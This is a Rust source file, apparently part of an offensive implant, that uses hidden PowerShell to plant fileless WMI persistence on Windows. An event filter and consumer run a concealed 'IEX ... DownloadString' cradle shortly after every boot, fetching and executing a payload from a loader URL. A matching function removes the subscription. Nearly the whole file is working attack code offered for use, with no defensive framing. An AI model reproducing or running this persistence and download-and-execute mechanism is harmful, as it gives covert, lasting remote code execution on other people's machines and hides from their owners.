use std::process::Command;

pub struct WmiPersistence;

impl WmiPersistence {
    pub fn install() {
        // We use PowerShell to interact with WMI because binding to COM in Rust is verbose.
        // This creates a "Fileless" persistence mechanism.
        // It triggers the payload every time the system has been up for ~200-300 seconds (post-boot).

        let ps_script = r#"
$FilterName = "RedKingFilter"
$ConsumerName = "RedKingConsumer"
$ExePath = "powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://localhost:9000/api/payload/loader')\""

# 1. Create Event Filter
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
$WMI_EventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$FilterName; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query=$Query} -ErrorAction SilentlyContinue

# 2. Create Event Consumer
$WMI_EventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\subscription" -Arguments @{Name=$ConsumerName; CommandLineTemplate=$ExePath} -ErrorAction SilentlyContinue

# 3. Bind Filter and Consumer
Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\subscription" -Arguments @{Filter=$WMI_EventFilter; Consumer=$WMI_EventConsumer} -ErrorAction SilentlyContinue

Write-Output "Persistence Planted."
"#;

        match Command::new("powershell")
            .args(&[
                "-NoProfile",
                "-WindowStyle",
                "Hidden",
                "-Command",
                ps_script,
            ])
            .output()
        {
            Ok(_) => println!("👻 [GHOST] WMI Persistence Implanted (Fileless)."),
            Err(e) => println!("❌ [GHOST] Failed to plant persistence: {}", e),
        }
    }

    pub fn remove() {
        let ps_cleanup = r#"
$FilterName = "RedKingFilter"
$ConsumerName = "RedKingConsumer"
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {($_.Filter -like "*$FilterName*") -and ($_.Consumer -like "*$ConsumerName*")} | Remove-WmiObject
"#;
        Command::new("powershell")
            .args(&[
                "-NoProfile",
                "-WindowStyle",
                "Hidden",
                "-Command",
                ps_cleanup,
            ])
            .output()
            .ok();
    }
}
